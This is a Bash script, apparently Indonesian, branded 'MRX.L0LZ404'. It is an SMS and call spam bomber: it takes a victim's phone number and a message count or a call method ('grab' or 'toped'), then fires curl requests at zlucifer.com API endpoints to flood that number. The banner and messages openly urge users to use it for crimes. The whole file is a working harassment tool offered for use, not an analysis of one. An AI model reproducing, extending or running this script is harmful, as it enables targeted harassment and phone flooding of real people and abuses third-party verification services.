#!/bin/bash
#///////////////////////////////////////////////////////////////////////////////
#///////////////////////////////////////////////////////////////////////////////
#////		 __  __  ____  _  _    __    ___  __    ____  __    ___    __  	////
#////		(  \/  )(  _ \( \/ )  (  )  / _ \(  )  (_   )/. |  / _ \  /. | 	////
#////		 )    (  )   / )  (    )(__( (_) ))(__  / /_(_  _)( (_) )(_  _)	////
#////		(_/\/\_)(_)\_)(_/\_)()(____)\___/(____)(____) (_)  \___/   (_) 	////
#////																		////
#////                                                                       ////
#///////////////////////////////////////////////////////////////////////////////
#///////////////////////////////////////////////////////////////////////////////
#PERINGATAN : KESALAHAN ATAU KEJAHATAN ADALAH TANGGUNG JAWAB DARI PEMAKAI
#GUNAKAN TOOLS INI UNTUK KEJAHATAN EAA BANGSAT!!! :)
troll(){
    clear
    sleep 0.03
    echo "         _ "
    sleep 0.03
    echo "        /_)  _.-===-._ "
    sleep 0.03
    echo "       /  .; '_-.'- .'.     _ "
    sleep 0.03
    echo "  __ _/  /.'\ ._  '. , \   (_\ "
    sleep 0.03
    echo " /\_( \  |.'.-._'- .  '|     \ "
    sleep 0.03
    echo " |_)  /  |/'    ''--''\|     _\__ "
    sleep 0.03
    echo " \_)_|  /'  ._.   ._.  '\   / )(_\ "
    sleep 0.03
    echo " )/  (  \_      _      _/   \' (_| "
    sleep 0.03
    echo " /   /    \           /     _) (_/ "
    sleep 0.03
    echo " |   '',_ _'._'---'_.'_ _,.'    | \ "
    sleep 0.03
    echo " \    /  \ \  '''''  / / /     /   \ "
    sleep 0.03
    echo "  \_.'    \ \       / /  |   .' "
    sleep 0.03
    echo "   '--.,   \ \     / /  _;-'' "
    sleep 0.03
    echo "       '|   \ \   / /   | "
    sleep 0.03
    echo "       .;----'''''''----;. "
    sleep 0.03
    echo "      /(                 )\ "
    sleep 0.03
    echo "      \_''-------------''_/ "
    sleep 0.03
    echo "      | '';-----;-----;'' | "
    sleep 0.03
    echo "      | / : \ / : \ / : \ | "
    sleep 0.03
    echo "      |V.','.V.','.V.','.V| "
    sleep 0.03
    echo "      \'./_\.;./_\.;./_\.'/ "
    sleep 0.03
    echo "       ';..___________..;' "
    sleep 0.03
    echo " ============================="
    sleep 2
    echo " ==      MRX.L0LZ404        =="
    sleep 0.7
    echo " ============================="
}
load(){
    echo -e "\n"
    bar=" >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> "
    barlength=${#bar}
    i=0
    while((i<100)); do
        n=$((i*barlength / 100))
        printf "\e[00;32m\r[%-${barlength}s]\e[00m" "${bar:0:n}"
        ((i += RANDOM%5+2))
        sleep 0.2
    done
}
get_sms=$(curl -s http://zlucifer.com/api/sms.php)
get_call=$(curl -s http://zlucifer.com/api/call.php)
mulai (){
    echo "Lu Mau Ulang Lagi Nggak?"
    echo "y/n?"
    echo
    read lagi
    if [ $lagi = "y" ]; then
            spam
    else
            echo "Good Bye My Friends,Moga Aja Lu Tenang Di Alam Sana!"
    fi
}
#spam
spam(){
    clear
    troll
    echo
    echo "[1] Spam SMS"
    echo "[2] Spam Call"
    echo "[3] Close MRX.L0LZ404"
    echo
    echo "1/2/3?"
    read pilih
    if [ $pilih = "1" ]; then
            echo "Ini Spam Sms Eaa Bngst!!!"
            #function spam
            echo
            echo "Masukin No Target Lu Bngst!"
            echo Nihh Contoh Nya 0812345678
            read target Oyy # masukin no telp
            echo
            echo "Lu Mau Kirim Berapa Kmvret?"
            read paket
            echo
            echo Apakah nomor $target "dan SMS dikirim "$paket" sudah benar Su?"
            echo y/n?
            read confirm
            echo
            if [ $confirm = "y" ]; then
                    load
                    clear
                    echo Melakukan spam SMS ke nomor $target
                    echo
                    echo "Jangan Di Close Sebelum Spam Selesai"
                    echo "========================================"
                    target_do=$get_sms'/sms.php?nomor='$target'&paket='$paket
                    CURL_RESPONSE=`curl -s -o /dev/null -w "%{http_code}" $target_do`
                    echo " Gunakan Buat Kejahatan Eaa Bngst!!!"
                    echo
                    echo " Love u always "
                    echo " -MRX.L0LZ404"
                    echo "======================================="
            else
                    echo "Lu Salah Kmvret!!!"
            fi
        mulai
    elif [ $pilih = "2" ]; then
            echo "Ini Spam Call Eaa Bngst!!!"
            #function spam
            echo
            echo "Masukin No Target Lu Vantad!!!"
            echo Nih Contoh Nya! 0812345678
            read target # masukin no telp
            echo
            echo "Lu Mau Yg Mana Njert?"
            echo "[1] GRAB"
            echo "[2] TOPED"
            echo "1/2?"
            read api
            if [ $api = "1" ]; then
                  api_spam="grab"
            else
                  api_spam="toped"
            fi
            echo Apakah nomor $target dan spam menggunakan $api_spam "sudah benar Su?"
            echo y/n?
            read confirm
            echo
            if [ $confirm = "y" ]; then
                  load
                  clear
                  echo Melakukan spam call ke nomor $target
                  echo
                  echo "Jangan Di Close Eaa Sebelum Spam Selesai"
                  echo "========================================"
                  cek_target=`curl -s $get_call/call.php?nomor=$target"&method="$api_spam`
                  echo -e $cek_target
                  echo " Gunakan Tools ini Demi Kejahatan Eaa Bngst!!!"
                  echo
                  echo " Love u always "
                  echo " -MRX.L0LZ404"
                  echo "========================================"
            else
                  echo Kesalahan, Lu Gimana Sihh Anjert :v
            fi
        mulai
    elif [ $pilih = "3" ]; then
        echo "Thanks You Moga Aja Lu Tenang Di Alam Sana :v"
        close
    else
        clear
        echo "Kesalahan"
        mulai
    fi
}
close(){
    exit
}
clear
echo "Loading.."
load
clear
troll
echo Welcome Eaa Bngst!, Kasih Tau Nick Lu Asw? #tulisan keluar
read nick #membaca yang ditulis
clear
troll
echo Selamat datang $nick ":)"
echo
echo "Mulai Tools MRX.L0LZ404?"
echo "y/n?"
read mulai
if [ $mulai = "y" ]; then
      spam
else
      close
fi
